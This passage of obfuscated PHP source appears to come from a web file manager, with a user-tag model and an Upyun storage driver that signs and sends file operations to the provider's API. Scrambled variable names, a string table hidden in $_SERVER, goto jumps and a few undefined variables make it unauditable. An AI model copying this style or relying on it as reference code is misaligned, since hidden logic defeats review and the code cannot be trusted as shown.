$Œäé¼ìÆ =& $_SERVER[¥ÙÌÜ¾ê]; if ($­Ç½Àéğ == $Œäé¼ìÆ[33]) { return $GLOBALS[$Œäé¼ìÆ[6]][$Œäé¼ìÆ[2223]]; } if ($­Ç½Àéğ == $Œäé¼ìÆ[2224]) { return $GLOBALS[$Œäé¼ìÆ[6]][$Œäé¼ìÆ[2225]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\x2e\164\141\147\114\151\x73\x74"; public $modelType = "\x55\163\x65\x72\117\x70\164\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\163\x74\171\x6c\145", "\163\157\x72\164"); public function listData($ø×œâÅ³ = false, $è•ÑÒİ = "\163\157\x72\164", $”€§ÌÚ§ = false) { return parent::listData($ø×œâÅ³, $è•ÑÒİ, $”€§ÌÚ§); } public function remove($Ëæ¢Áæ•) { return parent::remove($Ëæ¢Áæ•); } public function add($¿Ï…äƒ¤, $òÔøÇ“ˆ = "\x6c\x61\142\145\x6c\x2d\147\162\145\x79\55\x6e\x6f\x72\155\x61\154") { $ÜÜÑï™ =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->findByName($¿Ï…äƒ¤)) { return !1; } $›šíƒ«’ = array($ÜÜÑï™[415] => $¿Ï…äƒ¤, $ÜÜÑï™[478] => $òÔøÇ“ˆ, $ÜÜÑï™[1753] => $this->getSort($ÜÜÑï™[256]) + 1); return parent::insert($›šíƒ«’); } public function update($ÓøŠÒí±, $Â¯ó¬á) { $£Âƒ„¤§ =& $_SERVER[¥ÙÌÜ¾ê]; $ë¨±¼ö® = $this->listData($ÓøŠÒí±); $µÑÌˆ³Ô = $this->findByName($Â¯ó¬á[$£Âƒ„¤§[28]]); if (!$ë¨±¼ö® || $µÑÌˆ³Ô && $µÑÌˆ³Ô[$£Âƒ„¤§[395]] != $ë¨±¼ö®[$£Âƒ„¤§[395]]) { return !1; } return parent::update($ÓøŠÒí±, $Â¯ó¬á); } public function moveTop($Ş¼á“İ£) { $¼Ã¤µŠ— =& $_SERVER[¥ÙÌÜ¾ê]; $ÔáÀé¾ª = parent::listData(); $˜®ü…ÓÎ = $this->getSort($¼Ã¤µŠ—[255]); foreach ($ÔáÀé¾ª as &$“ØİÍÈ³) { if ($“ØİÍÈ³[$¼Ã¤µŠ—[395]] == $Ş¼á“İ£) { $“ØİÍÈ³[$¼Ã¤µŠ—[1772]] = $˜®ü…ÓÎ; continue; } $“ØİÍÈ³[$¼Ã¤µŠ—[1772]] += 1; } unset($“ØİÍÈ³); return parent::resetData($ÔáÀé¾ª); } public function moveBottom($®†˜Ğ­) { $ŞŒËó¨ƒ =& $_SERVER[¥ÙÌÜ¾ê]; $œÆ”ìçŒ = $this->getSort($ŞŒËó¨ƒ[256]) + 1; return parent::update($®†˜Ğ­, array($ŞŒËó¨ƒ[1772] => $œÆ”ìçŒ)); } public function resetSort($Ğ¦ç‰¤Î) { $›ì°”ø‚ =& $_SERVER[¥ÙÌÜ¾ê]; $ÊÖ¶Ü±û = array(); $Ğ¦ç‰¤Î = is_array($Ğ¦ç‰¤Î) ? $Ğ¦ç‰¤Î : array(); for ($©ÜÄí = 0; $©ÜÄí < count($Ğ¦ç‰¤Î); $©ÜÄí++) { $ÊÖ¶Ü±û[$Ğ¦ç‰¤Î[$©ÜÄí] . $›ì°”ø‚[33]] = $©ÜÄí + 1; } $÷‡¦·ØÂ = parent::listData(); foreach ($÷‡¦·ØÂ as &$‘šùÁ§) { $‹¦œº©‰ = $ÊÖ¶Ü±û[$‘šùÁ§[$›ì°”ø‚[395]]]; $‘šùÁ§[$›ì°”ø‚[1772]] = $‹¦œº©‰ ? $‹¦œº©‰ : $‘šùÁ§[$›ì°”ø‚[1772]]; } unset($‘šùÁ§); return parent::resetData($÷‡¦·ØÂ); } private function getSort($Ê–›Ä†ã) { $ğñÓÇ€Œ =& $_SERVER[¥ÙÌÜ¾ê]; $ĞÁä·‡Ï = parent::listData(); $»ù¸¯ıò = array_to_keyvalue($ĞÁä·‡Ï, $ğñÓÇ€Œ[33], $ğñÓÇ€Œ[1772]); if (!$»ù¸¯ıò) { $»ù¸¯ıò = array(0); } $½œƒ·‰² = $Ê–›Ä†ã == $ğñÓÇ€Œ[256] ? max($»ù¸¯ıò) : min($»ù¸¯ıò); return intval($½œƒ·‰²); } } goto D³ÒÆÒ—‘; A¸”çó ¬ù: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\x2f\57\166\60\x2e\x61\x70\151\x2e\165\x70\171\x75\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($÷ˆîåËö) { parent::__construct(); $this->_init($÷ˆîåËö); } public function _init($‚î…ß¤’) { $š¤”çüİ =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($‚î…ß¤’ as $À‘ºò˜î => $ãâŒÔŞ­) { if (isset($this->{$À‘ºò˜î})) { $this->{$À‘ºò˜î} = $ãâŒÔŞ­; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($š¤”çüİ[1377] . LNG($š¤”çüİ[1310])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¶–¦Ó×ë, $„–Ç‹¿æ = "\x47\x45\x54") { $ˆ‡Ó‹ğ =& $_SERVER[¥ÙÌÜ¾ê]; $»ùú¹£ = gmdate($ˆ‡Ó‹ğ[1343]); $Ö’ë¢… = base64_encode(hash_hmac($ˆ‡Ó‹ğ[1378], "{$„–Ç‹¿æ}\46{$¶–¦Ó×ë}\x26{$»ùú¹£}", md5("{$this->userpass}"), !0)); $¸­çïô  = array("\101\x75\164\150\157\162\x69\172\141\164\151\157\156\72\x55\120\131\x55\x4e\x20{$this->username}\72{$Ö’ë¢…}", "\104\141\x74\145\72{$»ùú¹£}"); return $¸­çïô ; } public function ussRequest($³ÚıÒŸû, $ì³÷™ä« = "\x47\105\x54", $È™¬˜óØ = false, $İùµ©æİ = false, $Ãğû»ü = false) { $õêÛŞå =& $_SERVER[¥ÙÌÜ¾ê]; $³ÚıÒŸû = trim($³ÚıÒŸû, $õêÛŞå[8]); $Ù¹‘ÑÃñ = "\57{$this->bucket}\57{$³ÚıÒŸû}"; $ŸÖ ‘ç™ = $this->ussHeaders($Ù¹‘ÑÃñ, $ì³÷™ä«); if ($İùµ©æİ) { $ŸÖ ‘ç™ = array_merge($ŸÖ ‘ç™, $İùµ©æİ); } $¸ğ±·ëç = url_request($this->endpoint . $Ù¹‘ÑÃñ, $ì³÷™ä«, $È™¬˜óØ, $ŸÖ ‘ç™, $Ãğû»ü); if (!$¸ğ±·ëç) { return array($õêÛŞå[1121] => !1, $õêÛŞå[1123] => $õêÛŞå[1379]); } if (strtolower($ì³÷™ä«) == $õêÛŞå[190] || in_array($¸ğ±·ëç[$õêÛŞå[1121]], array($õêÛŞå[1236], $õêÛŞå[1380]))) { $È™¬˜óØ = $¸ğ±·ëç[$õêÛŞå[1381]]; } else { $È™¬˜óØ = json_decode($¸ğ±·ëç[$õêÛŞå[1123]], !0); if (!$È™¬˜óØ) { $È™¬˜óØ = $¸ğ±·ëç[$õêÛŞå[1123]]; } else { if (!$¸ğ±·ëç[$õêÛŞå[743]] && isset($È™¬˜óØ[$õêÛŞå[1382]])) { $È™¬˜óØ = $È™¬˜óØ[$õêÛŞå[1382]]; } } } return array($õêÛŞå[1121] => $¸ğ±·ëç[$õêÛŞå[743]], $õêÛŞå[1123] => $È™¬˜óØ); } public function mkfile($–Ó©´µ­, $ªèÂÀüî = '', $ÄÒª×Ç = REPEAT_RENAME) { if ($this->setContent($–Ó©´µ­, $ªèÂÀüî)) { return $this->getPathOuter($–Ó©´µ­); } return !1; } public function mkdir($ò‡†‹›Ş, $„Ò‡ÚÓé = REPEAT_SKIP) { $“¬ç =& $_SERVER[¥ÙÌÜ¾ê]; $¢Üò¬à¥ = trim($ò‡†‹›Ş, $“¬ç[8]); if ($this->_isFolder($¢Üò¬à¥)) { return $this->getPathOuter($¢Üò¬à¥); } $í¢´Îãà = array($“¬ç[1383]); $ü”ÍŸ×’ = $this->ussRequest($¢Üò¬à¥, $“¬ç[224], !1, $í¢´Îãà); return $ü”ÍŸ×’[$“¬ç[1121]] ? $this->getPathOuter($¢Üò¬à¥) : !1; } public function copyFile($¨ñ­¼Ö, $¡òî ¹‰) { $÷¿ÉıÍØ =& $_SERVER[¥ÙÌÜ¾ê]; $ñ•Ü†‚ñ = array($÷¿ÉıÍØ[1384] . "\57{$this->bucket}\57{$¨ñ­¼Ö}", $÷¿ÉıÍØ[1385]); $ğôÌ¾» = $this->ussRequest($¡òî ¹‰, $÷¿ÉıÍØ[226], !1, $ñ•Ü†‚ñ); return $ğôÌ¾»[$÷¿ÉıÍØ[1121]] ? !0 : $this->getPathOuter($¡òî ¹‰); } public function moveFile($İùŞ…¹§, $šàÔûôê) { $¬é«ĞŞ  =& $_SERVER[¥ÙÌÜ¾ê]; $‡§÷¥ïß = array($¬é«ĞŞ [1386] . "\57{$this->bucket}\57{$İùŞ…¹§}", $¬é«ĞŞ [1385]); $ìº¥û Á = $this->ussRequest($šàÔûôê, $¬é«ĞŞ [226], !1, $‡§÷¥ïß); return $ìº¥û Á[$¬é«ĞŞ [1121]] ? !0 : $this->getPathOuter($šàÔûôê); } public function delFile($Ø¹ÃÅŠÆ) { $‰øúœ…” =& $_SERVER[¥ÙÌÜ¾ê]; $—®«òÉ‚ = $this->ussRequest($Ø¹ÃÅŠÆ, $‰øúœ…”[1387]); return $—®«òÉ‚[$‰øúœ…”[1121]] ? !0 : !1; } public function delFolder($ÌçŠÃÍ¥) { $Ù­Š‹ÊÍ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->exist($ÌçŠÃÍ¥)) { return !0; } $this->listItemCache = !1; $œ€Éëï = $Æ´ó‘°Ú = array(); $this->fileList($ÌçŠÃÍ¥, $œ€Éëï, $Æ´ó‘°Ú, !0); $this->listItemCache = !0; foreach ($Æ´ó‘°Ú as $‘ó£ÒåØ) { $ºí”üÏ = $this->ussRequest($‘ó£ÒåØ[$Ù­Š‹ÊÍ[28]], $Ù­Š‹ÊÍ[1387]); if (!$ºí”üÏ[$Ù­Š‹ÊÍ[1121]]) { return !1; } } foreach ($œ€Éëï as $…¦Àï­Â) { $ºí”üÏ = $this->ussRequest($…¦Àï­Â, $Ù­Š‹ÊÍ[1387]); if (!$ºí”üÏ[$Ù­Š‹ÊÍ[1121]]) { return !1; } } $ºí”üÏ = $this->ussRequest($ÌçŠÃÍ¥, $Ù­Š‹ÊÍ[1387]); return $ºí”üÏ[$Ù­Š‹ÊÍ[1121]]; } public function rename($—Û˜éŒÀ, $ˆ­ù²š) { if ($this->isFile($—Û˜éŒÀ)) { $ˆ­ù²š = get_path_father($—Û˜éŒÀ) . $ˆ­ù²š; return $this->moveFile($—Û˜éŒÀ, $ˆ­ù²š); } return $this->renameObject($—Û˜éŒÀ, $ˆ­ù²š); } public function fileInfo($„œ«ù‰, $˜´¨ = false, $Ú½œ¶Ï¼ = array()) { $±ÜÏÈ¡ =& $_SERVER[¥ÙÌÜ¾ê]; $ÏåŞšš = array($±ÜÏÈ¡[28] => $this->pathThis($„œ«ù‰), $±ÜÏÈ¡[76] => $this->getPathOuter($±ÜÏÈ¡[8] . $„œ«ù‰), $±ÜÏÈ¡[29] => $±ÜÏÈ¡[193], $±ÜÏÈ¡[78] => isset($Ú½œ¶Ï¼[$±ÜÏÈ¡[78]]) ? $Ú½œ¶Ï¼[$±ÜÏÈ¡[78]] : 0, $±ÜÏÈ¡[168] => $this->ext($„œ«ù‰)); if ($˜´¨) { return $ÏåŞšš; } $ÏåŞšš[$±ÜÏÈ¡[194]] = $ÏåŞšš[$±ÜÏÈ¡[84]] = 0; $ÏåŞšš[$±ÜÏÈ¡[195]] = $ÏåŞšš[$±ÜÏÈ¡[196]] = !0; if (empty($Ú½œ¶Ï¼)) { $Ú½œ¶Ï¼ = $this->objectMeta($„œ«ù‰); if (!$Ú½œ¶Ï¼) { return $ÏåŞšš; } } $ÏåŞšš[$±ÜÏÈ¡[194]] = intval($Ú½œ¶Ï¼[$±ÜÏÈ¡[1388]]); $ÏåŞšš[$±ÜÏÈ¡[84]] = intval($Ú½œ¶Ï¼[$±ÜÏÈ¡[1389]]); $ÏåŞšš[$±ÜÏÈ¡[78]] = $Ú½œ¶Ï¼[$±ÜÏÈ¡[78]]; return $ÏåŞšš; } public function folderInfo($•£•¦à…, $Ô¬óŠó = false) { $ÍÃ÷úÚ =& $_SERVER[¥ÙÌÜ¾ê]; $•ÑĞ¬¹ = array($ÍÃ÷úÚ[28] => $this->pathThis($•£•¦à…), $ÍÃ÷úÚ[76] => $this->getPathOuter($ÍÃ÷úÚ[8] . $•£•¦à…), $ÍÃ÷úÚ[29] => $ÍÃ÷úÚ[77]); if ($Ô¬óŠó) { return $•ÑĞ¬¹; } $•ÑĞ¬¹[$ÍÃ÷úÚ[194]] = $•ÑĞ¬¹[$ÍÃ÷úÚ[84]] = 0; $•ÑĞ¬¹[$ÍÃ÷úÚ[195]] = $•ÑĞ¬¹[$ÍÃ÷úÚ[196]] = !0; if (empty($¡Ù›—Ê¼)) { $¡Ù›—Ê¼ = $this->objectMeta($•£•¦à…); if (!$¡Ù›—Ê¼) { return $•ÑĞ¬¹; } } $•ÑĞ¬¹[$ÍÃ÷úÚ[194]] = intval($¡Ù›—Ê¼[$ÍÃ÷úÚ[1388]]); $•ÑĞ¬¹[$ÍÃ÷úÚ[84]] = intval($¡Ù›—Ê¼[$ÍÃ÷úÚ[1389]]); return $•ÑĞ¬¹; } private function listObjs($ß×š°«Ù, $ÖÖÖæÏ· = 0, $»…‚½ßø = 1000) { $ÁÓ¦‚— =& $_SERVER[¥ÙÌÜ¾ê]; $“ãç°Ç¾ = array($ÁÓ¦‚—[1390], $ÁÓ¦‚—[1391] . $»…‚½ßø); if ($ÖÖÖæÏ·) { $“ãç°Ç¾[] = $ÁÓ¦‚—[1392] . $ÖÖÖæÏ·; } $»§Ò˜™’ = $this->ussRequest($ß×š°«Ù, $ÁÓ¦‚—[228], !1, $“ãç°Ç¾); return !$»§Ò˜™’[$ÁÓ¦‚—[1121]] ? !1 : $»§Ò˜™’[$ÁÓ¦‚—[1123]]; } private function fileList($ôåÃµ°÷, &$ï«ÂÙ‡Î, &$ÉİÕá•«, $Ãò›’¶ = false) { $³ïáêÛ =& $_SERVER[¥ÙÌÜ¾ê]; $¦å……— = $³ïáêÛ[33]; $ÏÈÃ„ = 1000; $İ¥—¶şÃ = rtrim($ôåÃµ°÷, $³ïáêÛ[8]) . $³ïáêÛ[8]; $ÉËÁÉ¥ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $Ö†Î÷Ãº = $this->listObjs($ôåÃµ°÷, $¦å……—, $ÏÈÃ„); if (!$Ö†Î÷Ãº) { return !1; } $¦å……— = isset($Ö†Î÷Ãº[$³ïáêÛ[1393]]) ? $Ö†Î÷Ãº[$³ïáêÛ[1393]] : $³ïáêÛ[33]; $îä­ßúŠ = isset($Ö†Î÷Ãº[$³ïáêÛ[1394]]) ? $Ö†Î÷Ãº[$³ïáêÛ[1394]] : array(); foreach ($îä­ßúŠ as $í „ıı¥) { $¥¡Ş“ŸÍ = $í „ıı¥[$³ïáêÛ[29]] == $³ïáêÛ[77] ? !0 : !1; $óóÉÉËû = ltrim($İ¥—¶şÃ . $í „ıı¥[$³ïáêÛ[28]], $³ïáêÛ[8]) . ($¥¡Ş“ŸÍ ? $³ïáêÛ[8] : $³ïáêÛ[33]); $Æ·±”‘ = array($³ïáêÛ[28] => $óóÉÉËû, $³ïáêÛ[29] => $¥¡Ş“ŸÍ ? $³ïáêÛ[77] : $³ïáêÛ[193], $³ïáêÛ[78] => $í „ıı¥[$³ïáêÛ[335]], $³ïáêÛ[1389] => $í „ıı¥[$³ïáêÛ[1395]]); if ($ÉËÁÉ¥) { $this->cacheMethod($³ïáêÛ[199], $óóÉÉËû, $¥¡Ş“ŸÍ); $this->cacheMethod($³ïáêÛ[200], $óóÉÉËû, $Æ·±”‘); } if ($¥¡Ş“ŸÍ) { $ï«ÂÙ‡Î[] = $óóÉÉËû; if ($Ãò›’¶) { $this->fileList($óóÉÉËû, $ï«ÂÙ‡Î, $ÉİÕá•«, $Ãò›’¶); } continue; } $ÉİÕá•«[] = $Æ·±”‘; } if (count($îä­ßúŠ) < $ÏÈÃ„) { break; } } if ($ÉËÁÉ¥) { $this->cacheMethod($³ïáêÛ[199], $ôåÃµ°÷, !0); } } public function listPath($¤ü±áË”, $ıâë¨ğ– = false) { $¸ÒåùŒ• =& $_SERVER[¥ÙÌÜ¾ê]; $¨ã§ö’î = $¡öÍõ‚ = array(); $this->fileList($¤ü±áË”, $¨ã§ö’î, $¡öÍõ‚); foreach ($¨ã§ö’î as $ëƒµ‹ => $ ûØèá«) { $¨ã§ö’î[$ëƒµ‹] = $this->folderInfo($ ûØèá«, $ıâë¨ğ–); } foreach ($¡öÍõ‚ as $ëƒµ‹ => $ ûØèá«) { $¡öÍõ‚[$ëƒµ‹] = $this->fileInfo($ ûØèá«[$¸ÒåùŒ•[28]], $ıâë¨ğ–, $ ûØèá«); } return array($¸ÒåùŒ•[75] => $¨ã§ö’î, $¸ÒåùŒ•[74] => $¡öÍõ‚); } public function has($¬¢ñ˜€, $¸—’‘…‚ = false, $›”¶éÌä = true) { $‚à £×¢ =& $_SERVER[¥ÙÌÜ¾ê]; $Áçá”§¯ = $‚à £×¢[33]; $ÉÓ¥Ãµ¿ = 500; $Êá®ÁÛ€ = 0; $¥ª„ˆ©Ñ = 0; $šµş¯¶û = rtrim($¬¢ñ˜€, $‚à £×¢[8]) . $‚à £×¢[8]; while (!0) { check_abort(); $–óèî† = $this->listObjs($¬¢ñ˜€, $Áçá”§¯, $ÉÓ¥Ãµ¿); if (!$–óèî†) { return !1; } $Áçá”§¯ = isset($–óèî†[$‚à £×¢[1393]]) ? $–óèî†[$‚à £×¢[1393]] : $‚à £×¢[33]; $äŞ‚“€ = isset($–óèî†[$‚à £×¢[1394]]) ? $–óèî†[$‚à £×¢[1394]] : array(); if (empty($äŞ‚“€)) { break; } $¸’±áîˆ = array_filter($äŞ‚“€, function ($ßıà‚õ) { $¶üËšÜ =& $_SERVER[¥ÙÌÜ¾ê]; return $ßıà‚õ[$¶üËšÜ[29]] == $¶üËšÜ[77]; }); $çÀë¡« = count($äŞ‚“€); $¸’±áîˆ = count($¸’±áîˆ); $¤§µŞŒ£ = $çÀë¡« - $¸’±áîˆ; if ($¸—’‘…‚) { $¥ª„ˆ©Ñ += $¸’±áîˆ; $Êá®ÁÛ€ += $¤§µŞŒ£; if ($çÀë¡« < $ÉÓ¥Ãµ¿) { break; } continue; } if ($›”¶éÌä) { if ($¤§µŞŒ£) { return !0; } } else { if ($¸’±áîˆ) { return !0; } } if ($çÀë¡« < $ÉÓ¥Ãµ¿) { break; } } if ($¸—’‘…‚) { return array($‚à £×¢[203] => $Êá®ÁÛ€, $‚à £×¢[204] => $¥ª„ˆ©Ñ); } return !1; } public function listAll($Ìİ¿Ù¦) { $Æ‚ ®Â =& $_SERVER[¥ÙÌÜ¾ê]; $—Î¶ºÍÁ = $ıÈ‘èôå = array(); $this->fileList($Ìİ¿Ù¦, $—Î¶ºÍÁ, $ıÈ‘èôå, !0); $¹õïÒ÷í = array(); foreach ($ıÈ‘èôå as $®‚¹ø†‹) { $¹õïÒ÷í[$®‚¹ø†‹[$Æ‚ ®Â[28]]] = $®‚¹ø†‹[$Æ‚ ®Â[78]]; } foreach ($—Î¶ºÍÁ as $®‚¹ø†‹) { if (is_string($®‚¹ø†‹)) { $¹õïÒ÷í[$®‚¹ø†‹] = 0; } } return $this->listAllFiles($Ìİ¿Ù¦, array_keys($¹õïÒ÷í), $¹õïÒ÷í); } public function canRead($€öÓ³í) { return $this->exist($€öÓ³í) ? !0 : !1; } public function canWrite($èÈı«Æê) { return $this->exist($èÈı«Æê) ? !0 : !1; } public function getContent($´§¦ç–ì) { return $this->fileSubstr($´§¦ç–ì, 0, -1); } public function setContent($áÄ§ôĞ·, $Š£İÄŞÔ = '') { $Ê¸Àãî¢ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$Š£İÄŞÔ) { $èÂìë· = $this->ussRequest($áÄ§ôĞ·, $Ê¸Àãî¢[224]); return $èÂìë·[$Ê¸Àãî¢[1121]]; } $Œ„ÈÑÖŞ = $this->tempFile($this->pathThis($áÄ§ôĞ·)); file_put_contents($Œ„ÈÑÖŞ, $Š£İÄŞÔ); if ($this->upload($áÄ§ôĞ·, $Œ„ÈÑÖŞ)) { $this->tempFileRemve($Œ„ÈÑÖŞ); return !0; } return !1; } public function fileSubstr($Ö˜Ó£Ç, $§ˆÍµÑÁ, $“»åàÉÜ) { $äü¹Ñ =& $_SERVER[¥ÙÌÜ¾ê]; if (!($—ÓóÙ¥ß = $this->link($Ö˜Ó£Ç))) { return !1; } $íŠåøĞ = !1; if ($“»åàÉÜ > 0) { $²áÙ¯ø = $§ˆÍµÑÁ + $“»åàÉÜ - 1; $íŠåøĞ = array($äü¹Ñ[1356] . $§ˆÍµÑÁ . $äü¹Ñ[454] . $²áÙ¯ø); } $¦ÓÓÓ’Ş = url_request($—ÓóÙ¥ß, $äü¹Ñ[228], !1, $íŠåøĞ); return $¦ÓÓÓ’Ş[$äü¹Ñ[743]] ? $¦ÓÓÓ’Ş[$äü¹Ñ[1123]] : !1; } public function upload($å½ââİè, $î×æåœæ, $şÕ¨ËÅ„ = false, $¡Ø§åû = REPEAT_REPLACE) { $ï€£Îã =& $_SERVER[¥ÙÌÜ¾ê]; $ˆÁºà‡Œ = IO::size($î×æåœæ); if ($ˆÁºà‡Œ <= 1024 * 1024 * 200) { $¶µÄ×¶Ê = array($ï€£Îã[1396] . $î×æåœæ); $‡†ş³¡· = $this->ussRequest($å½ââİè, $ï€£Îã[226], $¶µÄ×¶Ê); return $‡†ş³¡·[$ï€£Îã[1121]] ? $this->getPathOuter($å½ââİè) : !1; } $ÚŞÅæ®¼ = 1024 * 1024 * 10; $õ“üø = array($ï€£Îã[1397], $ï€£Îã[1398] . $ˆÁºà‡Œ, $ï€£Îã[1399], $ï€£Îã[1400] . $ÚŞÅæ®¼); $‡†ş³¡· = $this->ussRequest($å½ââİè, $ï€£Îã[226], !1, $õ“üø); if (!$‡†ş³¡·[$ï€£Îã[1121]]) { return !1; } $ÖùìËá = $‡†ş³¡·[$ï€£Îã[1123]]; $á›«éŸ« = 0; $© ÎŠë† = $ÖùìËá[$ï€£Îã[1401]]; $±š„ƒ•í = fopen($î×æåœæ, $ï€£Îã[1307]); if (!$±š„ƒ•í) { return !1; } do { $²½×á®© = $ÖùìËá[$ï€£Îã[1402]]; fseek_64($±š„ƒ•í, $á›«éŸ«); $Ã»îÃí— = fread($±š„ƒ•í, $²½×á®©); $‰“Ò¸“ò = 0; do { $‰“Ò¸“ò++; $ÖùìËá = $this->uploadPart($å½ââİè, $ÖùìËá, $Ã»îÃí—); } while (!$ÖùìËá && $‰“Ò¸“ò < 3); if (!$ÖùìËá) { return !1; } $© ÎŠë† = $ÖùìËá[$ï€£Îã[1401]]; $á›«éŸ« += $²½×á®©; } while ($© ÎŠë† != -1); fclose($±š„ƒ•í); $õ“üø = array($ï€£Îã[1403], $ï€£Îã[1404] . $ÖùìËá[$ï€£Îã[1405]], $ï€£Îã[1399]); $‡†ş³¡· = $this->ussRequest($å½ââİè, $ï€£Îã[226], !1, $õ“üø); return $‡†ş³¡·[$ï€£Îã[1121]] ? $this->getPathOuter($Ò“„®ŸÑ) : !1; } private function uploadPart($ª €Î……, $©ÊÀšôò, &$§Î÷½š) { $††´Æ½ =& $_SERVER[¥ÙÌÜ¾ê]; $Çˆ¤€Ü = array($††´Æ½[1406], $††´Æ½[1404] . $©ÊÀšôò[$††´Æ½[1405]], $††´Æ½[1407] . $©ÊÀšôò[$††´Æ½[1401]], $††´Æ½[141] . $©ÊÀšôò[$††´Æ½[1402]]); $õÀßı¿ã = $this->ussRequest($ª €Î……, $††´Æ½[226], $§Î÷½š, $Çˆ¤€Ü); return !$õÀßı¿ã[$††´Æ½[1121]] ? $õÀßı¿ã[$††´Æ½[1121]] : $õÀßı¿ã[$††´Æ½[1123]]; } public function uploadFormData($÷åÁıÏ, $Çü‰Åº¾ = 3600) { return $this->uploadPolicy($÷åÁıÏ, $Çü‰Åº¾); } public function multiUploadFormData($à—¶ª±Ş, $Ö€†Òàõ = 3600) { $ØÏıë—— =& $_SERVER[¥ÙÌÜ¾ê]; $Ë§¯àÂ¡ = (int) $GLOBALS[$ØÏıë——[7]][$ØÏıë——[78]]; return $this->uploadPolicy($à—¶ª±Ş, $Ö€†Òàõ, $Ë§¯àÂ¡); } private function uploadPolicy($º¬•›, $óéİÁ‘“ = 3600, $ŸóÇÍ´ = 0) { $¿Ñ”Ú =& $_SERVER[¥ÙÌÜ¾ê]; $Æ€¥Ãî¨ = $¿Ñ”Ú[8] . $this->bucket; $ˆ´Ëş–ä = gmdate($¿Ñ”Ú[1343]); $Œ‰‹¤›Æ = array($¿Ñ”Ú[1408] => $this->bucket, $¿Ñ”Ú[1409] => $º¬•›, $¿Ñ”Ú[1410] => time() + $óéİÁ‘“, $¿Ñ”Ú[1411] => $ˆ´Ëş–ä); if ($ŸóÇÍ´) { $Œ‰‹¤›Æ[$¿Ñ”Ú[1323]] = $ŸóÇÍ´; } $”Â©×ô = base64_encode(json_encode($Œ‰‹¤›Æ)); $®µÜŠ÷¸ = base64_encode(hash_hmac($¿Ñ”Ú[1378], "\x50\117\123\124\46{$Æ€¥Ãî¨}\x26{$ˆ´Ëş–ä}\x26{$”Â©×ô}", md5("{$this->userpass}"), !0)); $Ö¶çØÊ = array($¿Ñ”Ú[1248] => $”Â©×ô, $¿Ñ”Ú[1412] => "\x55\120\131\x55\116\40{$this->username}\72{$®µÜŠ÷¸}", $¿Ñ”Ú[175] => $this->endpoint . $Æ€¥Ãî¨); return $Ö¶çØÊ; } public function download($ÖÅåĞªã, $ééÒÁµŸ) { $°ĞÛı—¯ = IO::getPathInner(IO::mkfile($ééÒÁµŸ)); if (!($Ïç¸î…£ = $this->link($ÖÅåĞªã))) { return !1; } $ŸØ‹˜èæ = 0; $«¥¢¡ı = 1024 * 200; $ÑáÓ­²³ = fopen($°ĞÛı—¯, $_SERVER[¥ÙÌÜ¾ê][1362]); while (!0) { $âë¢ßÒ = $this->fileSubstr($ÖÅåĞªã, $ŸØ‹˜èæ, $«¥¢¡ı); if ($âë¢ßÒ === !1) { return !1; } fwrite($ÑáÓ­²³, $âë¢ßÒ); $ŸØ‹˜èæ += $«¥¢¡ı; if (strlen($âë¢ßÒ) < $«¥¢¡ı) { break; } } fclose($ÑáÓ­²³); return $ééÒÁµŸ; } public function link($«—¹ã…’, $ûÃá–Œ = array()) { $±¨Ñ­Å =& $_SERVER[¥ÙÌÜ¾ê]; $«—¹ã…’ = trim($«—¹ã…’, $±¨Ñ­Å[8]); if (!empty($this->token)) { $ÑƒïÕóÛ = strtotime(date($±¨Ñ­Å[1413])); $ƒ í¦ê´ = substr(md5($this->token . $±¨Ñ­Å[282] . $ÑƒïÕóÛ . $±¨Ñ­Å[1414] . $«—¹ã…’), 12, 8) . $ÑƒïÕóÛ; $ûÃá–Œ[] = $±¨Ñ­Å[1415] . $ƒ í¦ê´; } $‡äê§¦í = !empty($ûÃá–Œ) ? $±¨Ñ­Å[70] . implode($±¨Ñ­Å[282], $ûÃá–Œ) : $±¨Ñ­Å[33]; return $this->getHost() . $±¨Ñ­Å[8] . $«—¹ã…’ . $‡äê§¦í; } public function fileOut($ÌÌ€Ó­ª, $ø¾úÖü› = false, $Á°¥İ¢• = false, $à³ú£¯ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÌÌ€Ó­ª, $ø¾úÖü›, $Á°¥İ¢•, $à³ú£¯); } if (!$Á°¥İ¢•) { $Á°¥İ¢• = $this->pathThis($ÌÌ€Ó­ª); } $Ê‰Â©éş = $ø¾úÖü› ? array($_SERVER[¥ÙÌÜ¾ê][1416] . rawurlencode($Á°¥İ¢•)) : array(); $¢Ğ¿üÏó = $this->link($ÌÌ€Ó­ª, $Ê‰Â©éş); $this->fileOutLink($¢Ğ¿üÏó); } public function fileOutServer($êÂ³ÂÏ“, $ñ«•õÚç = false, $ªÎ¼Æƒ¨ = false, $‚ùêŠŸÕ = '') { parent::fileOut($êÂ³ÂÏ“, $ñ«•õÚç, $ªÎ¼Æƒ¨, $‚ùêŠŸÕ); } public function fileOutImage($İ…›Ë˜ñ, $—…Åœ×ˆ = 250) { $Ğ°èòö‘ = $this->link($İ…›Ë˜ñ . $_SERVER[¥ÙÌÜ¾ê][1417] . $—…Åœ×ˆ); $this->fileOutLink($Ğ°èòö‘); } public function fileOutImageServer($Ò‰ï‹», $Àº¢Ï«È = 250) { parent::fileOutImage($Ò‰ï‹», $Àº¢Ï«È); } public function hashMd5($²‘µ¿ˆ™) { $ş¾ù”ôÜ =& $_SERVER[¥ÙÌÜ¾ê]; $¥—Ñóä‰ = $this->_objectMeta($²‘µ¿ˆ™); return isset($¥—Ñóä‰[$ş¾ù”ôÜ[208]]) ? $¥—Ñóä‰[$ş¾ù”ôÜ[208]] : !1; } public function size($üÔ¾ı›‚) { $Å¨¡Íò = $this->objectMeta($üÔ¾ı›‚); return $Å¨¡Íò ? $Å¨¡Íò[$_SERVER[¥ÙÌÜ¾ê][78]] : 0; } public function info($à›¥¤Ëä) { if 